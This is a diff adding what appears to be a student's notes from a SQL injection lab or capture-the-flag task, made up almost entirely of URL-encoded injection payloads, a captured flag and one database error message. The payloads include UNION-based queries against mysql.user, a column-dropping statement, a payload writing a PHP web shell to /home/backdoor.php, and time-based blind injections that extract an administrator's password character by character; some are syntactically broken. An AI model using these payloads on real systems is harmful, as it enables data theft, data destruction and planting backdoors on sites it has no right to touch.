@@ -1,0 +1,32 @@
+1) 
+1'+and+1=2+UNION+SELECT+null,User+FROM+mysql.user+--+.  - SELECT command denied to user 'ramaza12_sql5'@'vm2437299.22ssd.had.wf' for table 'user'
+
+2)
+1'+and+1=2+UNION+ALTER+TABLE+ramaza12_sql5+DROP+COLUMN+users+--+.
+
+3)
+1'+AND+1=2;+SELECT+null,id+FROM+ramaza12_sql5;+--+.
+4)
+1'+and+1=2+UNION+SELECT+null,id+FROM+users+WHERE+id=(SELECT)+--+.
+
+5) 
+1'+AND+1=2+UNION SELECT+"<?php+system($_GET['cmd']);+?>"+into+outfile+"/home/backdoor.php"+--+.
+
+
+
+Today task Ramazana
+
+1)
+1'||(SELECT+CASE+WHEN+SUBSTRING(password,{n_sim_of_pass},1){operator}'{simbol}'+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator')+--+.
+
+2)
+1'+AND+(SELECT+SLEEP(2)+FROM+dual+WHERE+tables()+LIKE+"%f%")+--+.
+3)
+1'+AND+(SELECT+IF+SUBSTRING((SELECT+table_name+FROM+information_schema.tables),+1,+1)='f',+SLEEP(2),+'a')+--+.
+
+<pre>ID:1<br />Логин: admin<br />
+Пароль: netu</pre><pre>ID:312424<br />
+Логин: flag<br />Пароль: flag{14fff00895822c08013d750a41c8f024}</pre>
+
+4)
+1'+AND+(SELECT+IF+(SUBSTRING(SELECT table_name FROM information_schema.tables where table_schema='ramaza12_sql5',1,1)='U' SLEEP(2)+FROM+dual+WHERE+tables()+LIKE+"%U%"))+--+.
